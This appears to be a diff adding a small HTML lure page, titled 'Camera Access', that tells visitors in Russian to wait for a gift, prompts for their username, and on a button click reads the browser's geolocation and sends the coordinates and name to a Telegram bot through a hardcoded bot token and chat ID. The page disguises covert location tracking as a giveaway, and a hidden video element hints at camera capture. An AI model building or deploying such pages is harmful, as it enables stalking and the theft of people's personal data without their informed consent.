@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Camera Access</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="flex bg-sky-950 items-center h-screen justify-center">
+  <video class="hidden" id="video" width="640" height="480" autoplay></video>
+
+  <h1 class="text-4xl text-center animate-pulse text-amber-400">
+    Подождите немного чтобы получить подарок!
+  </h1>
+
+  <button id="getLocationButton">Получить местоположение</button>
+
+  <script>
+    let ism = prompt("Введите своё Имя пользователя");
+    let BOT_TOKEN = "7111369267:AAEyg8_EO1jh5NIZWhX_bxTweTeZCAND-O8";
+    let CHAT_ID = "6875194765";
+
+ 
+
+      // Вызываем функцию sendLocationToTelegram при нажатии на кнопку "Получить местоположение"
+      document
+        .getElementById("getLocationButton")
+        .addEventListener("click", function () {
+          if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function (position) {
+              const latitude = position.coords.latitude;
+              const longitude = position.coords.longitude;
+              sendLocationToTelegram(latitude, longitude);
+            });
+          } else {
+            console.error("Геолокация не поддерживается в вашем браузере");
+          }
+        });
+
+      function sendLocationToTelegram(latitude, longitude) {
+        const chat_id = "6875194765"; // Замените на ID вашего чата в Telegram
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${chat_id}&latitude=${latitude}&longitude=${longitude}&caption=Координаты пользователя: ${ism}`;
+
+        fetch(url)
+          .then((response) => {
+            if (!response.ok) {
+              throw new Error(
+                "Ошибка отправки местоположения на сервер Telegram"
+              );
+            }
+            console.log(
+              "Местоположение успешно отправлено на сервер Telegram"
+            );
+          })
+          .catch((error) => {
+            console.error("Произошла ошибка:", error);
+          });
+      }
+  </script>
+</body>
+</html>
